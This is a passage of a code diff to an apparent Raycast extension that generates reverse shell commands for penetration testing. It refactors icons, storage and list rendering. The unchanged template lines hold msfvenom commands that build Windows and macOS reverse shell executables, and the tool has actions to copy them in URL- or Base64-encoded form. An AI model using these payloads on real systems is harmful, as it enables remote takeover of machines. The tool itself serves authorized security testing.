     type: "msfvenom-windows-x64",
     name: "MSFVenom Windows x64",
-    icon: "🎯",
+    icon: "",
     command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe",
     description: "MSFVenom Windows x64 EXE reverse shell",
     category: "msfvenom",
@@ -836,7 +846,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "msfvenom-windows-x86",
     name: "MSFVenom Windows x86",
-    icon: "🎯",
+    icon: "",
     command: "msfvenom -p windows/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f exe > shell.exe",
     description: "MSFVenom Windows x86 EXE reverse shell",
     category: "msfvenom",
@@ -848,7 +858,7 @@ const SHELL_TEMPLATES: ShellTemplate[] = [
   {
     type: "msfvenom-mac",
     name: "MSFVenom macOS",
-    icon: "🎯",
+    icon: "",
     command: "msfvenom -p osx/x64/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f macho > shell.macho",
     description: "MSFVenom macOS Mach-O reverse shell",
     category: "msfvenom",
@@ -923,31 +933,26 @@ function groupByOS(commands: ShellTemplate[]): Record<string, ShellTemplate[]> {
 }
 
 // ============================================================================
-// LocalStorage Functions
+// Preferences API Functions
 // ============================================================================
 
 const STORAGE_KEY_IP = "lastIP";
 const STORAGE_KEY_PORT = "lastPort";
 
-async function loadConfig(): Promise<Config> {
-  const ip = (await LocalStorage.getItem<string>(STORAGE_KEY_IP)) || "10.10.10.10";
-  const port = (await LocalStorage.getItem<string>(STORAGE_KEY_PORT)) || "9001";
+function loadConfig(): Config {
+  const ip = preferences[STORAGE_KEY_IP] || "10.10.10.10";
+  const port = preferences[STORAGE_KEY_PORT] || "9001";
   return { ip, port };
 }
 
-async function saveConfig(config: Config): Promise<void> {
-  await LocalStorage.setItem(STORAGE_KEY_IP, config.ip);
-  await LocalStorage.setItem(STORAGE_KEY_PORT, config.port);
+function saveConfig(config: Config): void {
+  preferences[STORAGE_KEY_IP] = config.ip;
+  preferences[STORAGE_KEY_PORT] = config.port;
 }
 
 // ============================================================================
 // Components
 // ============================================================================
-
-interface FormValues {
-  ip: string;
-  port: string;
-}
 
 // Display all generated commands list
 function ShowAllCommands({ ip, port }: FormValues) {
@@ -987,31 +992,45 @@ function ShowAllCommands({ ip, port }: FormValues) {
       searchBarAccessory={
         <List.Dropdown tooltip="Filter by OS" value={osFilter} onChange={setOsFilter}>
           <List.Dropdown.Item title="All Systems" value="all" />
-          <List.Dropdown.Item title="Linux" value="linux" icon="🐧" />
-          <List.Dropdown.Item title="Windows" value="windows" icon="🪟" />
-          <List.Dropdown.Item title="macOS" value="mac" icon="🍎" />
+          <List.Dropdown.Item
+            title="Linux"
+            value="linux"
+            icon={{ source: "https://cdn.jsdelivr.net/gh/devicons/devicon/icons/linux/linux-original.svg" }}
+          />
+          <List.Dropdown.Item
+            title="Windows"
+            value="windows"
+            icon={{ source: "https://cdn.jsdelivr.net/gh/devicons/devicon/icons/windows8/windows8-original.svg" }}
+          />
+          <List.Dropdown.Item
+            title="macOS"
+            value="mac"
+            icon={{ source: "https://cdn.jsdelivr.net/gh/devicons/devicon/icons/apple/apple-original.svg" }}
+          />
         </List.Dropdown>
       }
     >
       {Object.entries(groupedCommands).map(([groupKey, cmds]) => {
         const sectionTitle =
           sortBy === "os"
-            ? { linux: "🐧 Linux", mac: "🍎 macOS", windows: "🪟 Windows" }[groupKey] || groupKey
+            ? { linux: "🐧 Linux", mac: " macOS", windows: "🪟 Windows" }[groupKey] || groupKey
             : groupKey;
         return (
           <List.Section key={groupKey} title={sectionTitle}>
-            {cmds.map((cmd) => (
-              <List.Item
-                key={cmd.type}
-                icon={cmd.icon}
-                title={cmd.name}
-                accessories={cmd.os.map((os) => ({
-                  tag: { value: os.toUpperCase(), color: getOSTagColor(os) },
-                }))}
-                detail={
-                  <List.Item.Detail
-                    markdown={`
-# ${cmd.icon} ${cmd.name}
+            {cmds.map((cmd) => {
+              const iconUrl = getDeviconUrl(cmd.type);
+              return (
+                <List.Item
+                  key={cmd.type}
+                  icon={{ source: iconUrl }}
+                  title={cmd.name}
+                  accessories={cmd.os.map((os) => ({
+                    tag: { value: os.toUpperCase(), color: getOSTagColor(os) },
+                  }))}
+                  detail={
+                    <List.Item.Detail
+                      markdown={`
+# ${cmd.name}
 
 ## Description
 ${cmd.description}
@@ -1036,116 +1055,117 @@ ${cmd.listener ? `## Listener Command\n\n\`\`\`bash\n${cmd.listener}\n\`\`\`` : 
 > This command should only be used in authorized security testing environments.
 > Unauthorized use of reverse shells may violate laws and regulations.
 `}
-                  />
-                }
-                actions={
-                  <ActionPanel>
-                    <Action.CopyToClipboard
-                      title="Copy Command"
-                      content={cmd.command}
-                      shortcut={{ modifiers: ["cmd"], key: "c" }}
-                      onCopy={() => {
-                        showToast({
-                          style: Toast.Style.Success,
-                          title: "Copied to Clipboard",
-                          message: cmd.name,
-                        });
-                      }}
                     />
-                    <Action.CopyToClipboard
-                      title="Copy URL Encoded"
-                      content={urlEncode(cmd.command)}
-                      shortcut={{ modifiers: ["cmd", "shift"], key: "u" }}
-                      onCopy={() => {
-                        showToast({
-                          style: Toast.Style.Success,
-                          title: "Copied URL Encoded Command",
-                          message: cmd.name,
-                        });
-                      }}
-                    />
-                    <Action.CopyToClipboard
-                      title="Copy Base64 Encoded"
-                      content={base64Encode(cmd.command)}
-                      shortcut={{ modifiers: ["cmd", "shift"], key: "b" }}
-                      onCopy={() => {
-                        showToast({
-                          style: Toast.Style.Success,
-                          title: "Copied Base64 Encoded Command",
-                          message: cmd.name,
-                        });
-                      }}
-                    />
-                    {cmd.listener && (
+                  }
+                  actions={
+                    <ActionPanel>
                       <Action.CopyToClipboard
-                        title="Copy Listener Command"
-                        content={cmd.listener}
-                        shortcut={{ modifiers: ["cmd", "shift"], key: "l" }}
+                        title="Copy Command"
+                        content={cmd.command}
+                        shortcut={{ modifiers: ["cmd"], key: "c" }}
                         onCopy={() => {
                           showToast({
                             style: Toast.Style.Success,
-                            title: "Copied Listener Command",
+                            title: "Copied to Clipboard",
                             message: cmd.name,
                           });
                         }}
                       />
-                    )}
-                    <Action
-                      title="Save to File"
-                      icon={Icon.Download}
-                      shortcut={{ modifiers: ["cmd"], key: "s" }}
-                      onAction={async () => {
-                        try {
-                          const filePath = join(
-                            homedir(),
-                            "Downloads",
-                            `${cmd.type}_${Date.now()}${getFileExtension(cmd.type)}`,
-                          );
-                          await writeFile(filePath, cmd.command);
+                      <Action.CopyToClipboard
+                        title="Copy URL Encoded"
+                        content={urlEncode(cmd.command)}
+                        shortcut={{ modifiers: ["cmd", "shift"], key: "u" }}
+                        onCopy={() => {
                           showToast({
                             style: Toast.Style.Success,
-                            title: "Saved to File",
-                            message: filePath,
+                            title: "Copied URL Encoded Command",
+                            message: cmd.name,
                           });
-                        } catch (error) {
+                        }}
+                      />
+                      <Action.CopyToClipboard
+                        title="Copy Base64 Encoded"
+                        content={base64Encode(cmd.command)}
+                        shortcut={{ modifiers: ["cmd", "shift"], key: "b" }}
+                        onCopy={() => {
                           showToast({
-                            style: Toast.Style.Failure,
-                            title: "Save Failed",
-                            message: error instanceof Error ? error.message : "Unknown error",
+                            style: Toast.Style.Success,
+                            title: "Copied Base64 Encoded Command",
+                            message: cmd.name,
                           });
-                        }
-                      }}
-                    />
-                    <ActionPanel.Section title="Sort">
-                      <Action
-                        title="Sort by Category"
-                        icon={Icon.AppWindowList}
-                        shortcut={{ modifiers: ["cmd", "shift"], key: "1" }}
-                        onAction={() => setSortBy("category")}
+                        }}
                       />
+                      {cmd.listener && (
+                        <Action.CopyToClipboard
+                          title="Copy Listener Command"
+                          content={cmd.listener}
+                          shortcut={{ modifiers: ["cmd", "shift"], key: "l" }}
+                          onCopy={() => {
+                            showToast({
+                              style: Toast.Style.Success,
+                              title: "Copied Listener Command",
+                              message: cmd.name,
+                            });
+                          }}
+                        />
+                      )}
                       <Action
-                        title="Sort by Name"
-                        icon={Icon.Text}
-                        shortcut={{ modifiers: ["cmd", "shift"], key: "2" }}
-                        onAction={() => setSortBy("name")}
+                        title="Save to File"
+                        icon={Icon.Download}
+                        shortcut={{ modifiers: ["cmd"], key: "s" }}
+                        onAction={async () => {
+                          try {
+                            const filePath = join(
+                              homedir(),
+                              "Downloads",
+                              `${cmd.type}_${Date.now()}${getFileExtension(cmd.type)}`,
+                            );
+                            await writeFile(filePath, cmd.command);
+                            showToast({
+                              style: Toast.Style.Success,
+                              title: "Saved to File",
+                              message: filePath,
+                            });
+                          } catch (error) {
+                            showToast({
+                              style: Toast.Style.Failure,
+                              title: "Save Failed",
+                              message: error instanceof Error ? error.message : "Unknown error",
+                            });
+                          }
+                        }}
                       />
+                      <ActionPanel.Section title="Sort">
+                        <Action
+                          title="Sort by Category"
+                          icon={Icon.AppWindowList}
+                          shortcut={{ modifiers: ["cmd", "shift"], key: "1" }}
+                          onAction={() => setSortBy("category")}
+                        />
+                        <Action
+                          title="Sort by Name"
+                          icon={Icon.Text}
+                          shortcut={{ modifiers: ["cmd", "shift"], key: "2" }}
+                          onAction={() => setSortBy("name")}
+                        />
+                        <Action
+                          title="Sort by Os"
+                          icon={Icon.ComputerChip}
+                          shortcut={{ modifiers: ["cmd", "shift"], key: "3" }}
+                          onAction={() => setSortBy("os")}
+                        />
+                      </ActionPanel.Section>
                       <Action
-                        title="Sort by Os"
-                        icon={Icon.ComputerChip}
-                        shortcut={{ modifiers: ["cmd", "shift"], key: "3" }}
-                        onAction={() => setSortBy("os")}
+                        title="Re-enter Ip/port"
+                        icon={Icon.ArrowClockwise}
+                        shortcut={{ modifiers: ["cmd"], key: "r" }}
+                        onAction={pop}
                       />
-                    </ActionPanel.Section>
-                    <Action
-                      title="Re-enter Ip/port"
-                      icon={Icon.ArrowClockwise}
-                      shortcut={{ modifiers: ["cmd"], key: "r" }}
-                      onAction={pop}
-                    />
-                  </ActionPanel>
-                }
-              />
-            ))}
+                    </ActionPanel>
+                  }
+                />
+              );
+            })}
           </List.Section>
         );
       })}
@@ -1163,17 +1183,12 @@ export default function Command() {
 
   // Load configuration in background
   useEffect(() => {
-    loadConfig()
-      .then((config) => {
-        setIp(config.ip);
-        setPort(config.port);
-      })
-      .catch(() => {
-        // Keep default values
-      });
+    const config = loadConfig();
+    setIp(config.ip);
+    setPort(config.port);
   }, []);
 
-  async function handleSubmit(values: FormValues) {
+  function handleSubmit(values: FormValues) {
     // Validate IP
     if (!isValidIP(values.ip)) {
       setIpError("Invalid IP address format");
@@ -1191,7 +1206,7 @@ export default function Command() {
     setPortError(undefined);
 
     // Save configuration
-    await saveConfig({ ip: values.ip, port: values.port });
+    saveConfig({ ip: values.ip, port: values.port });
 
     // Navigate to commands list page
     push(<ShowAllCommands ip={values.ip} port={values.port} />);
